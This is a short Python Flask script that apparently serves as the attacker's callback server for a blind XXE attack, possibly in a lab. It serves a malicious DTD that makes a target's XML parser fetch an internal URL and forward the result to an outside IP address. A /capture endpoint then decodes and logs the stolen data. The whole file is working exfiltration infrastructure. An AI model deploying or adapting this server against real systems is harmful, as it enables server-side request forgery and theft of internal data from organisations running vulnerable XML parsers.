from __future__ import annotations

import base64
from datetime import datetime, timezone

from flask import Flask, Response, jsonify, request

app = Flask(__name__)


@app.get("/health")
def health():
    return jsonify(status="ok")


@app.get("/probe.dtd")
def probe_dtd():
    print("[DTD] probe.dtd requested", flush=True)

    dtd = r"""
    <!ENTITY % file SYSTEM "http://127.0.0.1:5000/internal/lab/db-export-url">
    <!ENTITY % param "<!ENTITY &#x25; query SYSTEM 'http://171.25.166.41:8081/capture?data=%file;'>">
    """.strip()
    return Response(
        dtd,
        status=200,
        content_type="application/xml-dtd",
    )

@app.before_request
def log():
    print(request.method, request.url, flush=True)



@app.get("/capture")
def capture():
    encoded = request.args.get("data", "")
    try:
        padding = "=" * (-len(encoded) % 4)
        decoded = base64.urlsafe_b64decode(encoded + padding).decode("utf-8")
    except Exception as error:
        decoded = f"[decode error: {error}] raw={encoded}"

    print(
        "\n[BLIND CALLBACK]",
        datetime.now(timezone.utc).isoformat(),
        f"source={request.remote_addr}",
        "\n",
        decoded,
        "\n",
        flush=True,
    )

    return Response("OK", content_type="text/plain; charset=utf-8")


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8081, debug=False, threaded=True)
